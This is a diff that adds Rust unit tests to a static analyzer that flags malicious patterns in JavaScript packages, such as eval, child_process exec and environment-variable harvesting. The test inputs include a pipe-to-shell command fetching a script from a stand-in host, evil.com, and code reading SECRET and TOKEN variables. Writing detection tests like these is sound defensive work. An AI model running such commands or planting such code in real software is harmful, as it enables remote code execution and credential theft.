@@ -383,3 +383,174 @@ impl Analyzer for StaticCodeAnalyzer {
         findings
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::{Path, PathBuf};
+
+    use crate::registry::package::PackageMetadata;
+    use crate::types::{FindingCategory, Severity};
+
+    fn default_metadata() -> PackageMetadata {
+        PackageMetadata {
+            name: Some("test-pkg".into()),
+            description: None,
+            versions: std::collections::HashMap::new(),
+            time: std::collections::HashMap::new(),
+            maintainers: None,
+            dist_tags: None,
+            extra: std::collections::HashMap::new(),
+        }
+    }
+
+    fn analyze_js(code: &str) -> Vec<Finding> {
+        let analyzer = StaticCodeAnalyzer;
+        let files = vec![(PathBuf::from("index.js"), code.to_string())];
+        let pkg = serde_json::json!({});
+        let metadata = default_metadata();
+        let tmp = Path::new("/tmp");
+        let ctx = AnalysisContext {
+            name: "test-pkg",
+            version: "1.0.0",
+            files: &files,
+            package_json: &pkg,
+            metadata: &metadata,
+            package_dir: tmp,
+        };
+        analyzer.analyze(&ctx)
+    }
+
+    fn analyze_file(file_name: &str, code: &str) -> Vec<Finding> {
+        let analyzer = StaticCodeAnalyzer;
+        let files = vec![(PathBuf::from(file_name), code.to_string())];
+        let pkg = serde_json::json!({});
+        let metadata = default_metadata();
+        let tmp = Path::new("/tmp");
+        let ctx = AnalysisContext {
+            name: "test-pkg",
+            version: "1.0.0",
+            files: &files,
+            package_json: &pkg,
+            metadata: &metadata,
+            package_dir: tmp,
+        };
+        analyzer.analyze(&ctx)
+    }
+
+    #[test]
+    fn detects_eval_with_dynamic_content() {
+        let findings = analyze_js("var x = eval(someVar);\n");
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title.contains("eval()"))
+            .collect();
+        assert!(!matched.is_empty(), "should detect eval with dynamic content");
+        assert_eq!(matched[0].severity, Severity::Critical);
+    }
+
+    #[test]
+    fn detects_function_constructor() {
+        let findings = analyze_js("var fn = new Function('return 1');\n");
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title.contains("Function constructor"))
+            .collect();
+        assert!(!matched.is_empty(), "should detect Function constructor");
+        assert_eq!(matched[0].severity, Severity::Critical);
+    }
+
+    #[test]
+    fn detects_child_process_exec() {
+        // The regex matches child_process followed by one of ')]  then .exec(
+        // This fires for unquoted bracket/call patterns.
+        let findings = analyze_js(
+            "var cp = x[child_process].exec('ls');\n",
+        );
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.category == FindingCategory::ProcessSpawn && f.severity == Severity::Critical)
+            .collect();
+        assert!(!matched.is_empty(), "should detect child_process exec call, got: {:?}", findings);
+    }
+
+    #[test]
+    fn detects_pipe_to_shell() {
+        // Put curl|bash inside a string so comment_strip doesn't eat the URL
+        let findings = analyze_js(
+            r#"const cmd = "curl http://evil.com/script.sh | bash";"#,
+        );
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title.contains("Pipe-to-shell"))
+            .collect();
+        assert!(!matched.is_empty(), "should detect pipe-to-shell pattern, got: {:?}", findings);
+        assert_eq!(matched[0].severity, Severity::Critical);
+    }
+
+    #[test]
+    fn detects_require_child_process() {
+        let findings = analyze_js("const cp = require('child_process');\n");
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title == "require('child_process')")
+            .collect();
+        assert!(!matched.is_empty(), "should detect require('child_process')");
+        assert_eq!(matched[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn detects_env_harvesting() {
+        let findings = analyze_file(
+            "lib/steal.js",
+            "const data = { a: process.env.SECRET, b: process.env.TOKEN };\n",
+        );
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.category == FindingCategory::EnvAccess)
+            .collect();
+        assert!(!matched.is_empty(), "should detect env harvesting, got: {:?}", findings);
+        assert_eq!(matched[0].severity, Severity::High);
+    }
+
+    #[test]
+    fn skips_single_line_comments() {
+        let findings = analyze_js("// eval(x)\n");
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title.contains("eval()"))
+            .collect();
+        assert!(matched.is_empty(), "should NOT flag eval inside a single-line comment");
+    }
+
+    #[test]
+    fn skips_multiline_block_comments() {
+        let findings = analyze_js("/* eval(x) */\n");
+        let matched: Vec<_> = findings
+            .iter()
+            .filter(|f| f.title.contains("eval()"))
+            .collect();
+        assert!(matched.is_empty(), "should NOT flag eval inside a block comment");
+    }
+
+    #[test]
+    fn skips_dist_directory() {
+        let findings = analyze_file("dist/bundle.js", "eval(x);\n");
+        assert!(findings.is_empty(), "should skip files in dist/ directory");
+    }
+
+    #[test]
+    fn skips_min_js_files() {
+        let findings = analyze_file("lib/vendor.min.js", "eval(x);\n");
+        assert!(findings.is_empty(), "should skip .min.js files");
+    }
+
+    #[test]
+    fn skips_non_js_files() {
+        let css_findings = analyze_file("styles/main.css", "eval(x);\n");
+        assert!(css_findings.is_empty(), "should skip .css files");
+
+        let md_findings = analyze_file("README.md", "eval(x);\n");
+        assert!(md_findings.is_empty(), "should skip .md files");
+    }
+}
